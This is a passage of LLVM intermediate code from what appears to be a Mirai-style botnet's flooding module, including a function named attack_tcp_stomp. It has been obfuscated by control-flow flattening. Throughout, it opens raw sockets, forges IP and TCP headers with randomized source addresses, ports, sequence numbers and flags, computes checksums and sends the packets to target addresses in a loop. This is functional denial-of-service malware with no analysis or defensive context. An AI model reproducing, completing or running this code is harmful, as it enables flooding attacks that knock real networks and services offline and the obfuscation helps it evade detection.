  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = load i16, i16* %16, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  store i16 %193, i16* %195, align 4
  %196 = load i16, i16* %17, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  %200 = load i32, i32* %18, align 4
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = zext i16 %202 to i32
  %204 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 2
  store i32 %203, i32* %205, align 4
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -241
  %210 = or i16 %209, 80
  store i16 %210, i16* %207, align 4
  %211 = load i8, i8* %20, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 13
  %218 = and i16 %215, -8193
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %21, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 12
  %227 = and i16 %224, -4097
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %22, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 11
  %236 = and i16 %233, -2049
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %23, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 10
  %245 = and i16 %242, -1025
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8, i8* %24, align 1
  %248 = sext i8 %247 to i16
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = and i16 %248, 1
  %253 = shl i16 %252, 9
  %254 = and i16 %251, -513
  %255 = or i16 %254, %253
  store i16 %255, i16* %250, align 4
  %256 = load i8, i8* %25, align 1
  %257 = sext i8 %256 to i16
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %257, 1
  %262 = shl i16 %261, 8
  %263 = and i16 %260, -257
  %264 = or i16 %263, %262
  store i16 %264, i16* %259, align 4
  %265 = call i32 @rand_next()
  %266 = and i32 %265, 65535
  %267 = trunc i32 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 5
  store i16 %267, i16* %269, align 2
  %270 = load i8, i8* %22, align 1
  %271 = icmp ne i8 %270, 0
  %272 = select i1 %271, i32 2116409024, i32 -375357790
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 4
  %276 = load i16, i16* %275, align 4
  %277 = and i16 %276, -2049
  %278 = or i16 %277, 2048
  store i16 %278, i16* %275, align 4
  store i32 -375357790, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8*, i8** %31, align 8
  %281 = load i32, i32* %26, align 4
  call void @rand_str(i8* %280, i32 %281)
  store i32 2076231690, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %9, align 4
  store i32 1104235553, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 -1112615036, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1309154351, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %9, align 4
  %289 = load i8, i8* %5, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp slt i32 %288, %290
  %292 = select i1 %291, i32 -555429725, i32 -1354345849
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8**, i8*** %11, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds i8*, i8** %294, i64 %296
  %298 = load i8*, i8** %297, align 8
  store i8* %298, i8** %32, align 8
  %299 = load i8*, i8** %32, align 8
  %300 = bitcast i8* %299 to %struct.iphdr*
  store %struct.iphdr* %300, %struct.iphdr** %33, align 8
  %301 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i64 1
  %303 = bitcast %struct.iphdr* %302 to %struct.tcphdr*
  store %struct.tcphdr* %303, %struct.tcphdr** %34, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i64 1
  %306 = bitcast %struct.tcphdr* %305 to i8*
  store i8* %306, i8** %35, align 8
  %307 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i64 %309
  %311 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i32 0, i32 2
  %312 = load i8, i8* %311, align 4
  %313 = zext i8 %312 to i32
  %314 = icmp slt i32 %313, 32
  %315 = select i1 %314, i32 488783129, i32 -430675301
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %318 = load i32, i32* %9, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 1
  %322 = load i32, i32* %321, align 4
  %323 = call i32 @ntohl(i32 %322) #7
  %324 = call i32 @rand_next()
  %325 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i32 0, i32 2
  %330 = load i8, i8* %329, align 4
  %331 = zext i8 %330 to i32
  %332 = lshr i32 %324, %331
  %333 = add i32 %323, %332
  %334 = call i32 @htonl(i32 %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 9
  store i32 %334, i32* %336, align 4
  store i32 -430675301, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %28, align 4
  %339 = icmp eq i32 %338, -1
  %340 = select i1 %339, i32 1309948297, i32 -816868330
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 @rand_next()
  %343 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 8
  store i32 %342, i32* %344, align 4
  store i32 -816868330, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i16, i16* %13, align 2
  %347 = zext i16 %346 to i32
  %348 = icmp eq i32 %347, 65535
  %349 = select i1 %348, i32 1811775723, i32 -1840815252
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = call i32 @rand_next()
  %352 = and i32 %351, 65535
  %353 = trunc i32 %352 to i16
  %354 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 3
  store i16 %353, i16* %355, align 4
  store i32 -1840815252, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i16, i16* %16, align 2
  %358 = zext i16 %357 to i32
  %359 = icmp eq i32 %358, 65535
  %360 = select i1 %359, i32 1584303909, i32 1908297981
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 0
  store i16 %364, i16* %366, align 4
  store i32 1908297981, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i16, i16* %17, align 2
  %369 = zext i16 %368 to i32
  %370 = icmp eq i32 %369, 65535
  %371 = select i1 %370, i32 -2026443998, i32 2043217239
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = call i32 @rand_next()
  %374 = and i32 %373, 65535
  %375 = trunc i32 %374 to i16
  %376 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 1
  store i16 %375, i16* %377, align 2
  store i32 2043217239, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* %18, align 4
  %380 = icmp eq i32 %379, 65535
  %381 = select i1 %380, i32 -444156403, i32 -1888090359
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 2
  store i32 %383, i32* %385, align 4
  store i32 -1888090359, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i32, i32* %19, align 4
  %388 = icmp eq i32 %387, 65535
  %389 = select i1 %388, i32 997071823, i32 -2133216053
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = call i32 @rand_next()
  %392 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 3
  store i32 %391, i32* %393, align 4
  store i32 -2133216053, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8, i8* %27, align 1
  %396 = icmp ne i8 %395, 0
  %397 = select i1 %396, i32 1091907575, i32 1021047436
  store i32 %397, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8*, i8** %35, align 8
  %400 = load i32, i32* %26, align 4
  call void @rand_str(i8* %399, i32 %400)
  store i32 1021047436, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* %405, i32 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 6
  store i16 0, i16* %410, align 4
  %411 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = bitcast %struct.tcphdr* %412 to i8*
  %414 = load i32, i32* %26, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 20, %415
  %417 = trunc i64 %416 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #7
  %419 = load i32, i32* %26, align 4
  %420 = sext i32 %419 to i64
  %421 = add i64 20, %420
  %422 = trunc i64 %421 to i32
  %423 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %411, i8* %413, i16 zeroext %418, i32 %422)
  %424 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 6
  store i16 %423, i16* %425, align 4
  %426 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 1
  %428 = load i16, i16* %427, align 2
  %429 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i32 0, i32 0
  %434 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %433, i32 0, i32 1
  store i16 %428, i16* %434, align 2
  %435 = load i32, i32* %10, align 4
  %436 = load i8*, i8** %32, align 8
  %437 = load i32, i32* %26, align 4
  %438 = sext i32 %437 to i64
  %439 = add i64 40, %438
  %440 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %441 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i32 0, i32 0
  %446 = bitcast %struct.sockaddr_in* %445 to %struct.sockaddr*
  store %struct.sockaddr* %446, %struct.sockaddr** %440, align 8
  %447 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %448 = load %struct.sockaddr*, %struct.sockaddr** %447, align 8
  %449 = call i64 @sendto(i32 %435, i8* %436, i64 %439, i32 16384, %struct.sockaddr* %448, i32 16)
  store i32 445414364, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i32, i32* %9, align 4
  %452 = add nsw i32 %451, 1
  store i32 %452, i32* %9, align 4
  store i32 -1309154351, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  store i32 -1112615036, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %453, %450, %401, %398, %394, %390, %386, %382, %378, %372, %367, %361, %356, %350, %345, %341, %337, %316, %293, %287, %286, %285, %282, %279, %273, %178, %174, %126, %120, %119, %116, %110, %109, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1054172545, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1054172545, label %first
    i32 607628062, label %106
    i32 -1377205539, label %107
    i32 -832331352, label %113
    i32 1676689897, label %116
    i32 -1881458871, label %117
    i32 -22150052, label %123
    i32 -548862747, label %124
    i32 -2144212128, label %128
    i32 301755558, label %129
    i32 1900843948, label %145
    i32 -1616625106, label %166
    i32 1853933205, label %175
    i32 1211336026, label %180
    i32 -1963980833, label %185
    i32 282586969, label %189
    i32 231572495, label %197
    i32 -69135126, label %209
    i32 -1965873233, label %210
    i32 -261691344, label %219
    i32 -840345323, label %224
    i32 1532227189, label %237
    i32 363854246, label %246
    i32 -1574014427, label %255
    i32 139317964, label %347
    i32 980603100, label %351
    i32 610616261, label %473
    i32 1968102614, label %482
    i32 -169645092, label %491
    i32 -221227553, label %494
    i32 -621211705, label %495
    i32 1400581307, label %496
    i32 2038591556, label %497
    i32 1219831582, label %503
    i32 533175854, label %506
    i32 -1176323581, label %507
    i32 -219056249, label %508
    i32 -723251530, label %511
    i32 1591198406, label %512
    i32 342043130, label %513
    i32 -2009572608, label %519
    i32 169885625, label %537
    i32 -1799344485, label %543
    i32 772910705, label %547
    i32 1686748489, label %550
    i32 743557590, label %622
    i32 431623966, label %625
    i32 -1439872230, label %626
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %104 = icmp eq i32 %.reload, -1
  %105 = select i1 %104, i32 607628062, i32 -1377205539
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 -1439872230, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  %112 = select i1 %111, i32 -832331352, i32 1676689897
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 %114)
  store i32 -1439872230, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1881458871, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %9, align 4
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %118, %120
  %122 = select i1 %121, i32 -22150052, i32 -723251530
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 -548862747, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %125, i32* %26, align 4
  %126 = icmp eq i32 %125, -1
  %127 = select i1 %126, i32 -2144212128, i32 301755558
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -219056249, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* %26, align 4
  %131 = load i32, i32* %26, align 4
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %131, i32 3, i32 0)
  %133 = or i32 %132, 2048
  %134 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 4, i32 %133)
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %135, align 4
  %136 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 2
  %141 = load i8, i8* %140, align 4
  %142 = zext i8 %141 to i32
  %143 = icmp slt i32 %142, 32
  %144 = select i1 %143, i32 1900843948, i32 -1616625106
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 1
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @ntohl(i32 %151) #7
  %153 = call i32 @rand_next()
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 4
  %160 = zext i8 %159 to i32
  %161 = lshr i32 %153, %160
  %162 = add i32 %152, %161
  %163 = call i32 @htonl(i32 %162) #7
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  store i32 %163, i32* %165, align 4
  store i32 1853933205, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  store i32 1853933205, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i16, i16* %17, align 2
  %177 = zext i16 %176 to i32
  %178 = icmp eq i32 %177, 65535
  %179 = select i1 %178, i32 1211336026, i32 -1963980833
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = call i32 @rand_next()
  %182 = and i32 %181, 65535
  %183 = trunc i32 %182 to i16
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %183, i16* %184, align 2
  store i32 282586969, i32* %switchVar
  br label %loopEnd

